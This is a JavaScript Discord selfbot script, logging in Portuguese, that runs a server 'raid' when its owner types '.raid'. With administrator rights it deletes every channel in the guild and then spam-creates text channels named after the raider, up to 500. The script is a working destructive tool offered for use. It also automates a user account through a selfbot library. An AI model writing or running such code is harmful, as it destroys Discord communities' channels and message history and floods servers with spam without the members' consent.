console.clear();
const { Console } = require('console');
const { channel } = require('diagnostics_channel');
const { ChannelType } = require('discord-api-types/v10');
const { Client } = require('discord.js-selfbot-v13');
const client = new Client();
require('dotenv').config()

client.once('ready', async () => {
    console.log(`🍃 | ${client.user.tag} está comendo sua bunda!`) 
})


client.on('messageCreate', async message =>{
    if(message.author.bot) return; //se a mensagem for de um bot essa linha não deixa o bot responder.


    if(message.content == '.raid'){
        
        if(message.author.id != client.user.id){
            console.log('❌ | Alguém tentou usar comando do selfbot.')
            return
        }

        await message.delete();
        
        if(!message.guild){
            console.log('❌ | Não se pode deletar canais no privado.')
            return;
        }

        if (!message.member.permissions.has('ADMINISTRATOR')) {
            return console.log('🎃 | Sem permissão para fazer isso.');
        }
        
        // Começo da lógica
        const channels = message.guild.channels.cache;

        for (const channel of channels.values()) {

            try {
                await channel.delete();
            } catch (error) {
                console.log('❌ | Erro ao deletar um canal.')
            }
        }




        const channelCount = message.guild.channels.cache.size;
        const maxChannels = 500;
        const channelsToCreate = maxChannels - channelCount;

        if (channelsToCreate <= 0) {
            return message.reply('❌ | Nenhum canal para se criar.');
        }

        for (let i = 0; i < channelsToCreate; i++) {
            try {
                await message.guild.channels.create(`raidados-por-${client.user.tag}`, {
                    type: 'GUILD_TEXT',
                });
            } catch (error) {
                return console.log('❌ | Erro ao spamar canais: ' + error)
            }
        }

    }


})


client.login(process.env.TOKEN);